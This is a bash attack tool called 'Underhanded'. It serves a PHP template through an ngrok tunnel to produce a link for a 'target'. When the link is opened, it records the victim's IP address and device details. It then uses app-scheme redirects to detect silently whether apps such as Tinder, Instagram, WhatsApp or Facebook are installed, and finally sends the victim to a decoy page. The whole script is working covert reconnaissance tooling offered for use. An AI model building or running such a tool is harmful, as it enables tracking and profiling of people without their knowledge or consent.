#!/bin/bash
# Underhanded v1.0
# Coded by: github.com/thelinuxchoice/underhanded
# Twitter: @linux_choice
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;93m                   __         \e[0m\e[1;91m __                    __         __ \e[0m\n"
printf "\e[1;93m  __  ______  ____/ /__  _____\e[0m\e[1;91m/ /_  ____ _____  ____/ /__  ____/ / \e[0m\n"
printf "\e[1;93m / / / / __ \/ __  / _ \/ ___/\e[0m\e[1;91m __ \/ __ \`/ __ \/ __  / _ \/ __  /  \e[0m\n"
printf "\e[1;93m/ /_/ / / / / /_/ /  __/ /  \e[0m\e[1;91m/ / / / /_/ / / / / /_/ /  __/ /_/ /   \e[0m\n"
printf "\e[1;93m\__,_/_/ /_/\__,_/\___/_/  \e[0m\e[1;91m/_/ /_/\__,_/_/ /_/\__,_/\___/\__,_/    \e[0m\n"


printf "\n \e[1;77mv1.0 coded by: github.com/thelinuxchoice/underhanded\e[0m \n"
printf " \e[1;77mtwitter: @linux_choice\e[1;77m\e[0m"
printf "\n"


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
#if [[ $checkssh == *'ssh'* ]]; then
#killall -2 ssh > /dev/null 2>&1
#fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }


}


catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
printf "\n\e[1;92m[\e[0m+\e[1;92m] Waiting target to press \"Reload\"...\n"

}

checkfound() {


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "result.txt" ]]; then

if [[ $(cat result.txt) == "true" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[1;77m Checked!\e[0m\e[1;91m Target has\e[0m\e[1;93m %s\e[0m\e[1;91m intalled!\e[0m\n" $app
elif [[ $(cat result.txt) == "false" ]];then
printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[1;77m App isn't installed or permission to redirect was refused\e[0m\n" $app

fi
rm -rf result.txt
fi
sleep 0.5

done 

}

ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}

build() {

IFS=$'\n'
sed 's+redirect_url+'$redirect_url'+g' template | sed 's+redirect_app+'$app_redir'+g' > index.php
ngrok_server

}

menu() {

printf "\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[1;91m No user interaction:\n\e[0m\n"
printf "\e[1;33m[\e[0m\e[1;77m01\e[0m\e[1;33m] Tinder\n"
printf "\e[1;33m[\e[0m\e[1;77m02\e[0m\e[1;33m] Instagram\n"
printf "\e[1;33m[\e[0m\e[1;77m03\e[0m\e[1;33m] Messenger\n"
printf "\e[1;33m[\e[0m\e[1;77m04\e[0m\e[1;33m] Facebook\n"
printf "\e[1;33m[\e[0m\e[1;77m05\e[0m\e[1;33m] WhatsApp\n"
printf "\e[1;33m[\e[0m\e[1;77m06\e[0m\e[1;33m] Twitter\n\n"

printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[1;91m Requires user interaction (only 1st time):\n\e[0m\n"

printf "\e[1;33m[\e[0m\e[1;77m07\e[0m\e[1;33m] Badoo\n"
printf "\e[1;33m[\e[0m\e[1;77m08\e[0m\e[1;33m] Telegram\n"
printf "\e[1;33m[\e[0m\e[1;77m09\e[0m\e[1;33m] Netflix\n"
printf "\e[1;33m[\e[0m\e[1;77m10\e[0m\e[1;33m] \e[0m\e[1;91mCustom (URL or appScheme://)\n"

printf "\n"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] \e[0m\e[1;77mChoose an option: \e[0m'
read catchapp

if [ -z "$catchapp" ]; then
 exit 1
fi

if [ "$catchapp" -eq 1 ]; then

app="Tinder"
app_redir="tinder://"

elif [ "$catchapp" -eq 2 ];then

app="Instagram"
app_redir="instagram://media?id=2262608909527220902"

elif [ "$catchapp" -eq 3 ];then

app="Messenger"
app_redir="fb-messenger://"

elif [ "$catchapp" -eq 4 ];then

app="Facebook"
app_redir="fb://"

elif [ "$catchapp" -eq 5 ];then

app="Whatsapp"
app_redir="whatsapp://send?text=ops"

elif [ "$catchapp" -eq 6 ];then

app="Twitter"
app_redir="twitter://user?screen_name=twitter"


elif [ "$catchapp" -eq 7 ];then

app="Badoo"
app_redir="https://bdo.to/u/abcdef"
elif [ "$catchapp" -eq 8 ];then

app="Telegram"
app_redir="https://t.me/"
elif [ "$catchapp" -eq 9 ];then

app="Netflix"
app_redir="https://www.netflix.com/title/12345678?source="
elif [ "$catchapp" -eq 10 ];then

app="Custom"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] \e[0m\e[1;77mURL or \"appScheme://\": \e[0m'
read app_redir
if [ -z "$app_redir" ]; then
 exit 1
fi

else
exit 1

fi

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] \e[0m\e[1;77mRedirect page after attack: \e[0m'
read redirect_url
if [ -z "$redirect_url" ]; then
redirect_url="https://www.google.com"
fi

if [ "${redirect_url:0:4}" != "http" ]; then

printf "\e[1;93mMissing \e[0m\e[1;77mhttp/https\e[0m\n"
exit 1
fi
build


}

banner
dependencies
menu

